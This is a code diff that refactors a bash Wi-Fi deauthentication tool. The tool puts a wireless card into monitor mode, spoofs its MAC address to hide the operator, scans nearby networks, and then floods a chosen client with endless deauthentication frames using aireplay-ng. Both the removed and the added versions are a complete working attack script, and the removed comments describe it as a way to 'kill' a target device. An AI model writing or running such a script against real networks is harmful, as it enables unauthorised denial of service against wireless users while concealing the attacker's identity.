@@ -1,75 +1,69 @@
 #!/bin/bash
-#THIS IS MY FIRST TOOL @WIFI_DEAUTHER
-#THIS WILL KILL THE SPECIFIC TARGET IN DESIRED NETWORK
+# WIFI_DEAUTHER Tool
 
+# Check if running as root
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root" 
+   exit 1
+fi
 
-echo -e $greenme 
-echo " RUN THIS TOOL IN ROOT  "
-sleep 3
-#colour declaration 
-#
-redme="\e[1;31m"
-greenme="\e[0;32m"
-yellowme="\e[1;33m"
-green2="\e[1;32m"
-white="\e[1;37m"
-#
-#
-#
-#
-trap overload EXIT 
-#
-#
-function overload()
-
-{
-     clear 
-         sleep 1
-             airmon-ng stop wlan0mon 
-                macchanger -p wlan0
-                  clear
-                     
-                    echo -e $redme
-                 echo  "thanks for using my script support me and follow me @bash_.kid "
-             echo -e $yellowme
-          echo  "follow my github for further tools and exploits : https://github.com/Ba5hb0y "
-       echo -e $greenme
-echo  " AIM FOR IMPOSSIBLE "
-exit
- 
+# Function to clean up and exit
+function cleanup {
+    echo "Cleaning up..."
+    airmon-ng stop wlan0mon > /dev/null 2>&1
+    echo "Script ended."
+    exit
 }
-  
-              
 
+trap cleanup EXIT
 
+# Start monitor mode on the wireless interface
+echo "Starting wlan0 in monitor mode..."
+airmon-ng start wlan0 > /dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+    echo "Failed to start monitor mode on wlan0. Exiting."
+    exit 1
+fi
 
+echo "Interface wlan0mon is now in monitor mode."
 
+# Change MAC address
+echo "Changing MAC address..."
+macchanger -r wlan0mon > /dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+    echo "Failed to change MAC address. Exiting."
+    exit 1
+fi
 
-echo -e $green2
-airmon-ng start wlan0 
-echo -e $white 
-echo " wlan0 in moniter mode "
-ifconfig wlan0mon down
-echo " changing mac "
-echo -e $green2
-macchanger -r wlan0mon
-echo -e $white
-echo " mac changed now ur ur safe "
-echo -e $green2
-ifconfig wlan0mon up
-fileName=$(date  --rfc-3339=seconds).csv
-echo -e $green2
-airodump-ng --update 2 wlan0mon |& tee $fileName
-echo -e $redme
-echo ' select the target network .. '
-echo -e $white
+echo "MAC address changed successfully."
+
+# Bring up the interface
+echo "Bringing up wlan0mon..."
+ifconfig wlan0mon up > /dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+    echo "Failed to bring up wlan0mon. Exiting."
+    exit 1
+fi
+
+echo "Interface wlan0mon is now up."
+
+# Capture information about nearby networks
+fileName=$(date +%Y-%m-%d_%H-%M-%S).csv
+echo "Capturing network information..."
+airodump-ng wlan0mon --output-format csv -w $fileName > /dev/null 2>&1 &
+
+sleep 5  # Wait for airodump-ng to capture some data
+echo "Press Enter when ready to continue..."
+read
+
+# Select target network and device to deauthenticate
+echo "Select the target network (BSSID):"
 read nameAP
-echo -e $redme 
-echo  ' select the device u want to kill'
-echo -e $white
+echo "Select the device to deauthenticate (Station MAC):"
 read Device
-macTarget=$(grep $nameAP $fileName | tr -s [:space:] | cut -d ' ' -f2 | uniq)
-channelTarget=$(grep $nameAP $fileName | tr -s [:space:] | cut -d ' ' -f7 | uniq)
-airmon-ng start wlan0mon $channelTarget
-echo -e $redme
-aireplay-ng -0 0  -a $macTarget -c $Device wlan0mon 
+
+# Perform deauthentication attack
+echo "Performing deauthentication attack on $Device from $nameAP..."
+aireplay-ng -0 0 -a $nameAP -c $Device wlan0mon
+
+cleanup  # Clean up and exit
